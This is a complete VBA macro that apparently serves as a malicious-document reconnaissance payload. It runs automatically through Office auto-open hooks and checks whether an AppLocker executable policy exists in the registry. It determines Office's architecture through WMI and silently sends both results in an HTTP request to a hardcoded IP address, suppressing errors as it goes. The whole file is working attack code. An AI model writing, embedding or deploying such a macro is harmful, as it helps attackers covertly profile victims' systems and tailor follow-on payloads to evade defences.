Option Explicit

Sub AutoOpen()
    CheckSystemStatus
End Sub

Sub DocumentOpen()
    CheckSystemStatus
End Sub

Sub Workbook_Open()
    CheckSystemStatus
End Sub

Sub AutoExec()
    CheckSystemStatus
End Sub

Sub CheckSystemStatus()
    Dim strUrl As String
    Dim regValue
    Dim processName As String
    Dim wmiService As Object
    Dim processList As Object
    Dim processItem As Object
    Dim is64Bit As Boolean
    Dim applockerStatus As String
    Dim archStatus As String
    Dim result As String
    Dim WindowShell As Object
    
    ' Check AppLocker Status
    Set WindowShell = CreateObject("WScript.shell")
    On Error Resume Next
    regValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe")
    
    If Err <> 0 Then
        applockerStatus = "on"
    Else
        applockerStatus = "off"
    End If
    
    ' Check Architecture (using winword.exe as example)
    On Error GoTo 0
    processName = "winword.exe"
    
    ' Create WMI query and get process list
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
    
    ' Check if process is found and determine 64-bit status
    If processList.Count > 0 Then
        For Each processItem In processList
            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
            If is64Bit Then
                archStatus = "x64"
            Else
                archStatus = "x86"
            End If
        Next
    Else
        ' If process not found, check system architecture via environment
        If Len(Environ("ProgramFiles(x86)")) > 0 Then
            archStatus = "x64"
        Else
            archStatus = "x86"
        End If
    End If
    
    ' Combine results
    result = "AppLocker=" & applockerStatus & "&Architecture=" & archStatus
    
    ' Change URL
    strUrl = "http://192.168.45.175:8000/status.txt?" & result
        
    ' Send GET request
    Dim hReq As Object
    Set hReq = CreateObject("MSXML2.XMLHTTP")
    
    On Error Resume Next
    With hReq
        .Open "GET", strUrl, False
        .Send
    End With
    On Error GoTo 0
    
    ' Clean up
    Set hReq = Nothing
    Set WindowShell = Nothing
    Set wmiService = Nothing
    Set processList = Nothing
    
End Sub
